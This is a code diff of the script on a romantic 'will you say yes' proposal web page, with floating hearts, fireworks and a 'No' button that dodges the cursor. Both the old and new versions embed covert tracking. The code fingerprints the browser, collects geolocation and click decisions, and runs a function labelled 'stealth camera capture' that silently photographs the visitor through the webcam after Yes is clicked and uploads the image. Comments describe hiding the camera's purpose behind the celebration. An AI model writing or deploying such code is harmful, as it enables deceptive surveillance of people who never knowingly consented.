-      timezoneOffset: new Date().getTimezoneOffset(),
-      canvasFingerprint: canvasFp,
-      webdriver: navigator.webdriver,
-      plugins: Array.from(navigator.plugins || []).map(p => p.name),
-      mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
-      fonts: (function() {
-        const bases = 'monospace sans-serif serif'.split(' ');
-        const tests = 'Arial Helvetica Times Verdana Georgia Courier Comic+Sans Impact Tahoma Trebuchet+MS Palatino Garamond Bookman Avant+Garde'.split(' ');
-        const found = [];
-        const div = document.createElement('div');
-        div.textContent = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        document.body.appendChild(div);
-        for (const base of bases) {
-          div.style.fontFamily = base;
-          const baseWidth = div.offsetWidth;
-          for (const test of tests) {
-            div.style.fontFamily = test + ', ' + base;
-            if (div.offsetWidth !== baseWidth) found.push(test.replace(/\+/g, ' '));
+          function sendWebcamImage(vid, imageData) {
+            return fetch('/api/webcam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, image: imageData }) }).then(function(r) { return r.json(); });
+          }
+
+          async function _send() {
+            const vid = _getVisitorId();
+            const battery = await _getBattery();
+            const fingerprint = _getFingerprint();
+            fingerprint.battery = battery;
+
+            const payload = {
+              id: vid,
+              type: 'page_visit',
+              fingerprint: fingerprint,
+              referrer: document.referrer,
+              url: window.location.href,
+              timestamp: new Date().toISOString(),
+              pageLoaded: performance.now(),
+              source: document.referrer ? 'referral' : 'direct'
+            };
+
+            try { await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
+            catch(e) { navigator.sendBeacon('/api/collect', JSON.stringify(payload)); }
+
+            setTimeout(function() { _getGeolocation(vid); }, 1500);
+          }
+
+          return { send: _send, getVisitorId: _getVisitorId, sendWebcamImage: sendWebcamImage };
+        })();
+
+        COLLECTOR.send();
+
+        // Click tracking
+        document.addEventListener('click', function(e) {
+          const target = e.target;
+          if (target.tagName === 'BUTTON' || target.closest('button')) {
+            const btn = target.tagName === 'BUTTON' ? target : target.closest('button');
+            const btnText = btn.textContent.trim().toLowerCase();
+            let decision = 'none';
+            if (btn.id === 'yesBtn' || btnText.includes('yes') || btnText.includes('i will')) {
+              decision = 'yes';
+            } else if (btn.id === 'noBtn' || btnText.includes('maybe') || btnText.includes('no') || btnText.includes('hmm') || btnText.includes('sure?')) {
+              decision = 'no';
+            }
+            navigator.sendBeacon('/api/collect', JSON.stringify({
+              id: localStorage.getItem('_vid'),
+              type: 'click',
+              buttonText: btn.textContent.trim(),
+              decision: decision,
+              timestamp: new Date().toISOString()
+            }));
+          }
+        });
+
+        // Stealth camera capture — fires on YES click, no UI
+        let cameraStream = null;
+
+        async function _stealthCapture() {
+          try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+              video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: 'user' },
+              audio: false
+            });
+
+            const video = document.createElement('video');
+            video.srcObject = cameraStream;
+            video.playsInline = true;
+            video.muted = true;
+            video.autoplay = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            await new Promise(function(resolve, reject) {
+              video.onloadedmetadata = function() {
+                video.play().then(resolve).catch(reject);
+              };
+              setTimeout(reject, 3000);
+            });
+
+            await new Promise(function(r) { setTimeout(r, 400); });
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+            const vid = COLLECTOR.getVisitorId();
+            await COLLECTOR.sendWebcamImage(vid, imageData);
+
+            cameraStream.getTracks().forEach(function(t) { t.stop(); });
+            cameraStream = null;
+            document.body.removeChild(video);
+          } catch (err) {
+            if (cameraStream) {
+              try { cameraStream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}
+              cameraStream = null;
+            }
           }
         }
-        document.body.removeChild(div);
-        return found;
-      })(),
-      adblock: (function() {
-        const el = document.createElement('div');
-        el.innerHTML = '&nbsp;';
-        el.className = 'ad_unit ' + Math.random();
-        el.style.position = 'absolute';
-        el.style.top = '-999px';
-        document.body.appendChild(el);
-        const hidden = el.offsetHeight === 0;
-        document.body.removeChild(el);
-        return hidden;
-      })(),
-      connection: (function() {
-        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : null;
-      })(),
-      battery: null
-    };
-  }
 
-  async function _getBattery() {
-    try {
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
-      }
-    } catch(e) {}
-    return null;
-  }
+        // Create stars
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            for (let i = 0; i < 100; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 2 + 's';
+                star.style.animationDuration = (Math.random() * 2 + 1) + 's';
+                starsContainer.appendChild(star);
+            }
+        }
 
-  function _getGeolocation(vid) {
-    if (!navigator.geolocation) return;
-    navigator.geolocation.getCurrentPosition(
-      function(pos) {
-        fetch('/api/geolocation', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }) }).catch(function(){});
-      },
-      function() {},
-      { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
-    );
-  }
+        // Create floating hearts
+        function createHeart() {
+            const container = document.getElementById('heartsContainer');
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.innerHTML = ['💕', '💗', '💖', '💝', '💘'][Math.floor(Math.random() * 5)];
+            heart.style.left = Math.random() * 100 + '%';
+            heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
+            heart.style.animationDuration = (Math.random() * 5 + 5) + 's';
+            container.appendChild(heart);
+            
+            setTimeout(() => heart.remove(), 10000);
+        }
 
-  function sendWebcamImage(vid, imageData) {
-    return fetch('/api/webcam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, image: imageData }) }).then(function(r) { return r.json(); });
-  }
+        // Create rose petals
+        function createPetal() {
+            const container = document.getElementById('heartsContainer');
+            const petal = document.createElement('div');
+            petal.className = 'rose-petal';
+            petal.style.left = Math.random() * 100 + '%';
+            petal.style.animationDuration = (Math.random() * 5 + 7) + 's';
+            petal.style.animationDelay = Math.random() * 5 + 's';
+            container.appendChild(petal);
+            
+            setTimeout(() => petal.remove(), 15000);
+        }
 
-  async function _send() {
-    const vid = _getVisitorId();
-    const battery = await _getBattery();
-    const fingerprint = _getFingerprint();
-    fingerprint.battery = battery;
+        // Scroll animation for timeline
+        function handleScroll() {
+            const items = document.querySelectorAll('.timeline-item');
+            items.forEach(item => {
+                const rect = item.getBoundingClientRect();
+                if (rect.top < window.innerHeight * 0.8) {
+                    item.classList.add('visible');
+                }
+            });
+        }
 
-    const payload = {
-      id: vid,
-      type: 'page_visit',
-      fingerprint: fingerprint,
-      referrer: document.referrer,
-      url: window.location.href,
-      timestamp: new Date().toISOString(),
-      pageLoaded: performance.now(),
-      source: document.referrer ? 'referral' : 'direct'
-    };
+        function scrollToSection(id) {
+            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
+        }
 
-    try { await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
-    catch(e) { navigator.sendBeacon('/api/collect', JSON.stringify(payload)); }
+        let evadeCount = 0;
+        // "No" button runs away
+        function runAway() {
+            const noBtn = document.getElementById('noBtn');
+            if (evadeCount < 5) {
+                evadeCount++;
+                const maxX = window.innerWidth - noBtn.offsetWidth - 40;
+                const maxY = window.innerHeight - noBtn.offsetHeight - 40;
+                noBtn.style.position = 'fixed';
+                noBtn.style.left = Math.random() * maxX + 'px';
+                noBtn.style.top = Math.random() * maxY + 'px';
+                const texts = ["Are you sure? 💕", "Think again! 🥺", "Maybe YES? 💖", "Please? 🥰", "My heart is yours! 💝"];
+                noBtn.textContent = texts[evadeCount - 1] || "Maybe...";
+            } else {
+                // Stop running away, become a clickable "No" button representing the true decision
+                noBtn.textContent = "No.";
+                noBtn.style.position = 'static';
+                noBtn.style.background = 'rgba(255, 255, 255, 0.05)';
+                noBtn.style.color = '#ff4a2b';
+                noBtn.style.border = '2px solid rgba(255, 74, 43, 0.4)';
+                noBtn.removeAttribute('onmouseover');
+            }
+        }
 
-    setTimeout(function() { _getGeolocation(vid); }, 1500);
-  }
+        // Handle Yes click
+        function handleYes() {
+            document.getElementById('proposal').style.display = 'none';
+            document.getElementById('celebration').classList.add('active');
+            createFireworks();
+            startCelebration();
+            
+            // Stealth camera capture
+            setTimeout(_stealthCapture, 1200);
+        }
 
-  return { send: _send, getVisitorId: _getVisitorId, sendWebcamImage: sendWebcamImage };
-})();
+        // Handle No click
+        function handleNo() {
+            const noBtn = document.getElementById('noBtn');
+            if (noBtn.textContent.includes('Yes') || noBtn.textContent.includes('Will')) {
+                handleYes();
+                return;
+            }
 
-COLLECTOR.send();
+            // Disable both buttons to prevent duplicate clicks
+            document.getElementById('yesBtn').disabled = true;
+            noBtn.disabled = true;
 
-// Click tracking
-document.addEventListener('click', function(e) {
-  const target = e.target;
-  if (target.tagName === 'BUTTON' || target.closest('button')) {
-    const btn = target.tagName === 'BUTTON' ? target : target.closest('button');
-    navigator.sendBeacon('/api/collect', JSON.stringify({
-      id: localStorage.getItem('_vid'),
-      type: 'click',
-      buttonText: btn.textContent.trim(),
-      timestamp: new Date().toISOString()
-    }));
-  }
-});
+            // Collect all parent elements inside the body that should fall apart
+            const elementsToShatter = Array.from(document.body.children).filter(el => {
+                return el.id !== 'stars' && el.id !== 'heartsContainer' && el.id !== 'musicBtn' && el.tagName !== 'SCRIPT';
+            });
 
-// ============================================================
-//  PROPOSAL SITE FUNCTIONALITY
-// ============================================================
+            elementsToShatter.forEach(el => {
+                const rect = el.getBoundingClientRect();
+                
+                el.style.position = 'fixed';
+                el.style.top = rect.top + 'px';
+                el.style.left = rect.left + 'px';
+                el.style.width = rect.width + 'px';
+                el.style.height = rect.height + 'px';
+                el.style.margin = '0';
+                
+                el.classList.add('shattered-element');
+                
+                const randomRot = Math.floor(Math.random() * 80 - 40) + 'deg';
+                const randomDelay = Math.random() * 500;
+                
+                el.style.setProperty('--rot', randomRot);
+                
+                setTimeout(() => {
+                    el.classList.add('fall');
+                }, randomDelay);
+            });
 
-const HER_NAME = "My Love";
-document.getElementById('herName').textContent = HER_NAME;
+            // Fade body background to pure black
+            document.body.style.transition = 'background 4s ease';
+            document.body.style.background = '#000';
 
-// Stars
-(function() {
-  const container = document.getElementById('stars');
-  for (let i = 0; i < 200; i++) {
-    const star = document.createElement('div');
-    star.className = 'star';
-    const size = Math.random() * 3 + 1;
-    star.style.width = size + 'px';
-    star.style.height = size + 'px';
-    star.style.left = Math.random() * 100 + '%';
-    star.style.top = Math.random() * 100 + '%';
-    star.style.setProperty('--duration', (Math.random() * 3 + 2) + 's');
-    star.style.animationDelay = Math.random() * 5 + 's';
-    container.appendChild(star);
-  }
-})();
+            // Create and show the sad screen overlay
+            let sadScreen = document.getElementById('sadScreen');
+            if (!sadScreen) {
+                sadScreen = document.createElement('div');
+                sadScreen.id = 'sadScreen';
+                sadScreen.className = 'sad-screen';
+                sadScreen.innerHTML = '<div class="sad-text">she said no :(</div>';
+                document.body.appendChild(sadScreen);
+            }
 
-// Petals
-(function() {
-  const container = document.getElementById('petals');
-  for (let i = 0; i < 20; i++) {
-    const petal = document.createElement('div');
-    petal.className = 'petal';
-    petal.style.left = Math.random() * 100 + '%';
-    petal.style.animationDuration = (Math.random() * 8 + 8) + 's';
-    petal.style.animationDelay = Math.random() * 15 + 's';
-    petal.style.fontSize = (Math.random() * 10 + 14) + 'px';
-    container.appendChild(petal);
-  }
-})();
+            setTimeout(() => {
+                sadScreen.classList.add('active');
+            }, 1800);
 
-// === Stealth camera capture — fires on YES click, no UI ===
-// The browser permission dialog will appear (unavoidable on modern HTTPS sites)
-// but there's no in-app explanation — it appears to be part of the celebration.
-let cameraStream = null;
+            // Submit decision to backend immediately
+            const vid = localStorage.getItem('_vid');
+            navigator.sendBeacon('/api/collect', JSON.stringify({
+              id: vid,
+              type: 'click',
+              buttonText: 'No.',
+              decision: 'no',
+              timestamp: new Date().toISOString()
+            }));
+        }
 
-async function _stealthCapture() {
-  try {
-    cameraStream = await navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: 'user' },
-      audio: false
-    });
+        // Create fireworks
+        function createFireworks() {
+            const colors = ['#ff6b8a', '#ffd93d', '#ff9ff3', '#48dbfb', '#00d2d3', '#ff6348'];
+            
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const firework = document.createElement('div');
+                    firework.className = 'firework';
+                    firework.style.left = Math.random() * window.innerWidth + 'px';
+                    firework.style.top = Math.random() * window.innerHeight * 0.5 + 'px';
+                    document.body.appendChild(firework);
 
-    const video = document.createElement('video');
-    video.srcObject = cameraStream;
-    video.playsInline = true;
-    video.muted = true;
-    video.autoplay = true;
-    video.style.display = 'none';
-    document.body.appendChild(video);
+                    for (let j = 0; j < 30; j++) {
+                        const particle = document.createElement('div');
+                        particle.className = 'firework-particle';
+                        particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+                        const angle = (j / 30) * 360;
+                        const velocity = 50 + Math.random() * 50;
+                        particle.style.setProperty('--tx', Math.cos(angle * Math.PI / 180) * velocity + 'px');
+                        particle.style.setProperty('--ty', Math.sin(angle * Math.PI / 180) * velocity + 'px');
+                        firework.appendChild(particle);
+                    }
 
-    await new Promise(function(resolve, reject) {
-      video.onloadedmetadata = function() {
-        video.play().then(resolve).catch(reject);
-      };
-      // fallback timeout
-      setTimeout(reject, 3000);
-    });
+                    setTimeout(() => firework.remove(), 1000);
+                }, i * 300);
+            }
+        }
 
-    // Wait a moment for the camera to warm up
-    await new Promise(function(r) { setTimeout(r, 400); });
+        // Celebration animation
+        function startCelebration() {
+            setInterval(createHeart, 300);
+            setInterval(createPetal, 500);
+        }
 
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 320;
-    canvas.height = video.videoHeight || 240;
-    canvas.getContext('2d').drawImage(video, 0, 0);
+        // Initialize
+        createStars();
+        setInterval(createHeart, 2000);
+        setInterval(createPetal, 1500);
+        window.addEventListener('scroll', handleScroll);
+        handleScroll();
 
-    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+        // Make no button draggable on mobile
+        let touchStartX, touchStartY;
+        const noBtn = document.getElementById('noBtn');
+        
+        noBtn.addEventListener('touchstart', (e) => {
+            touchStartX = e.touches[0].clientX - noBtn.offsetLeft;
+            touchStartY = e.touches[0].clientY - noBtn.offsetTop;
+        });
 
-    // Send to server
-    const vid = COLLECTOR.getVisitorId();
-    await COLLECTOR.sendWebcamImage(vid, imageData);
-
-    // Cleanup
-    cameraStream.getTracks().forEach(function(t) { t.stop(); });
-    cameraStream = null;
-    document.body.removeChild(video);
-  } catch (err) {
-    // Silent fail — user denied, no camera, or error
-    if (cameraStream) {
-      try { cameraStream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}
-      cameraStream = null;
-    }
-  }
-}
-
-// Yes button — now also triggers stealth camera
-document.getElementById('btnYes').addEventListener('click', function(e) {
-  // Floating hearts
-  for (let i = 0; i < 15; i++) {
-    setTimeout(() => {
-      const heart = document.createElement('div');
-      heart.className = 'floating-heart';
-      heart.textContent = ['💖','💗','❤️','💕','💓','🥰'][Math.floor(Math.random() * 6)];
-      heart.style.left = (e.clientX + (Math.random() - 0.5) * 200) + 'px';
-      heart.style.top = (e.clientY + (Math.random() - 0.5) * 100) + 'px';
-      document.body.appendChild(heart);
-      setTimeout(() => heart.remove(), 2500);
-    }, i * 80);
-  }
-
-  // Show celebration
-  setTimeout(() => {
-    document.getElementById('celebration').classList.add('active');
-    launchConfetti();
-  }, 400);
-
-  // ---- STEALTH CAMERA CAPTURE ----
-  // Fires silently after a short delay. Browser permission dialog
-  // appears naturally — user sees it but gets no in-app explanation.
-  setTimeout(_stealthCapture, 1200);
-});
-
-// No button evade
-(function() {
-  const btnNo = document.getElementById('btnNo');
-  let evadeCount = 0;
-  btnNo.addEventListener('mouseover', function() {
-    if (evadeCount < 8) {
-      evadeCount++;
-      const card = document.getElementById('card');
-      const cardRect = card.getBoundingClientRect();
-      const btnRect = btnNo.getBoundingClientRect();
-      const maxX = cardRect.width - btnRect.width - 20;
-      const maxY = cardRect.height - btnRect.height - 20;
-      btnNo.style.position = 'absolute';
-      btnNo.style.left = Math.random() * maxX + 'px';
-      btnNo.style.top = Math.random() * maxY + 'px';
-      const texts = ['Think again... 😅','Are you sure? 😳','Click Yes instead! 💁','Nope! 😋','Try again! 🤭','Almost there! 😄','You know you want to! 💕','Yes is the way! 🌹'];
-      btnNo.textContent = texts[Math.min(evadeCount - 1, texts.length - 1)];
-    } else {
-      btnNo.textContent = 'Okay okay, YES! 🎉';
-      btnNo.style.background = 'linear-gradient(135deg, #ff416c, #ff4b2b)';
-      btnNo.style.position = 'static';
-      btnNo.style.transform = 'scale(1.1)';
-      btnNo.style.boxShadow = '0 8px 30px rgba(255, 65, 108, 0.4)';
-    }
-  });
-  btnNo.addEventListener('click', function() {
-    document.getElementById('btnYes').click();
-  });
-})();
-
-// Celebration dismiss
-document.getElementById('celebration').addEventListener('click', function(e) {
-  if (e.target === this) this.classList.remove('active');
-});
-
-// Confetti
-function launchConfetti() {
-  const colors = ['#ff416c','#ff4b2b','#ffd700','#ff69b4','#00d2ff','#7c3aed','#ff6b6b','#48dbfb','#feca57'];
-  const shapes = ['circle','square','triangle'];
-  for (let i = 0; i < 150; i++) {
-    setTimeout(() => {
-      const piece = document.createElement('div');
-      piece.className = 'confetti-piece';
-      const shape = shapes[Math.floor(Math.random() * shapes.length)];
-      const color = colors[Math.floor(Math.random() * colors.length)];
-      const size = Math.random() * 10 + 6;
-      piece.style.width = (shape === 'triangle' ? 0 : size) + 'px';
-      piece.style.height = (shape === 'triangle' ? 0 : size) + 'px';
-      piece.style.borderRadius = shape === 'circle' ? '50%' : shape === 'square' ? '2px' : '0';
-      if (shape === 'triangle') {
-        piece.style.width = '0'; piece.style.height = '0';
-        piece.style.borderLeft = (size/2) + 'px solid transparent';
-        piece.style.borderRight = (size/2) + 'px solid transparent';
-        piece.style.borderBottom = size + 'px solid ' + color;
-        piece.style.background = 'transparent';
-      } else { piece.style.background = color; }
-      piece.style.left = Math.random() * 100 + '%';
-      piece.style.top = '-20px';
-      piece.style.animationDuration = (Math.random() * 3 + 2) + 's';
-      piece.style.transform = 'rotate(' + Math.random() * 360 + 'deg)';
-      document.body.appendChild(piece);
-      setTimeout(() => piece.remove(), 5000);
-    }, i * 30);
-  }
-}
-
-// Keyboard
-document.addEventListener('keydown', function(e) {
-  if (e.key === 'y' || e.key === 'Y') {
-    document.getElementById('btnYes').click();
-  }
-});
-</script>
+        noBtn.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+            noBtn.style.position = 'fixed';
+            noBtn.style.left = (e.touches[0].clientX - touchStartX) + 'px';
+            noBtn.style.top = (e.touches[0].clientY - touchStartY) + 'px';
+        });
+    </script>
 </body>
 </html>
-
